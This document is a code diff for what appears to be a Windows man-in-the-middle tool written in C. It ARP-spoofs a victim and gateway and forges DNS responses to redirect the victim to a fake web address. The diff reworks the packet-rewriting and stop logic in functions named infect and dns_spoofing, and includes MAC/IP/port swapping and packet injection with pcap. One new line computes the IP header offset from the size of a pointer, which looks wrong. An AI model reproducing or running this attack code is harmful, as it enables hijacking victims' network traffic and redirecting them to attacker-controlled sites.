@@ -81,7 +81,6 @@ static DWORD WINAPI start_arp_spoofing(
 		Sleep(2000);
 	}
 
-	finished_infecting = 0;
 	return 0;
 }
 
@@ -222,17 +221,8 @@ static int dns_spoofing(
 	/* create fake dns packet */
 	end_packet = create_fake_dns_respones(dns_header, dns_answer, dns_question);
 
-	/* switch dst/src eth/net/transport layers */
-	SET_DST_MAC(eth_header, infect_params.victim_mac);
-	SWITCH_IPS(((ip_hdr*)(packet + sizeof(ether_hdr))));
-	SWITCH_PORTS(((udp_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr))));
-	
-	/* change udp/ip header length fields */
-	change_packet_sizes(packet, end_packet);
-
 	/* update status */
 	*packet_size = (BYTE*)end_packet - (BYTE*)packet;
-	finished_infecting = 1;
 
 	return 1; // true if changed
 }
@@ -337,6 +327,7 @@ void infect()
 		{
 			if (WaitForSingleObject(hThread, 0) == WAIT_OBJECT_0)
 			{
+				stop_arp_spoofing();
 				CloseHandle(hThread);
 				break;
 			}
@@ -344,30 +335,33 @@ void infect()
 		}
 
 		ether_hdr* eth_header = (ether_hdr*)pkt_data;
+		ip_hdr* ip_header = (ip_hdr*)(pkt_data + sizeof(eth_header));
 		packet_size = pkt_header->caplen;
-
+		
 		/* change packet src/dst (MITM) */
 		if (COMPARE_MACS(eth_header->src_addr, infect_params.victim_mac)) // if src = taget
 		{	
 			/* check for DNS packets */
 			if (!dns_spoofing(pkt_data, &packet_size))
 				SET_DST_MAC(eth_header, infect_params.gateway_mac); // foward
+			else
+			{
+				/* switch dst/src eth/net/transport layers */
+				SET_DST_MAC(eth_header, infect_params.victim_mac);
+				SWITCH_IPS(((ip_hdr*)(pkt_data + sizeof(ether_hdr))));
+				SWITCH_PORTS(((udp_hdr*)(pkt_data + sizeof(ether_hdr) + sizeof(ip_hdr))));
+
+				/* change udp/ip header length fields */
+				change_packet_sizes(pkt_data, pkt_data + packet_size);
+			}
 		}
 		else
 			SET_DST_MAC(eth_header, infect_params.victim_mac); // else (dst = victim)
 		SET_SRC_MAC(eth_header, infect_params.adapter->Address); // src = this
 
+		finished_infecting = ip_header->dest_addr == fake_web;
+
 		/* foward packet */
 		pcap_sendpacket(fp, pkt_data, packet_size);
-
-		/* redirect worked */
-		if (finished_infecting)
-		{
-			stop_arp_spoofing();
-			CloseHandle(hThread);
-			break;
-		}
 	}
-
-	return;
 }
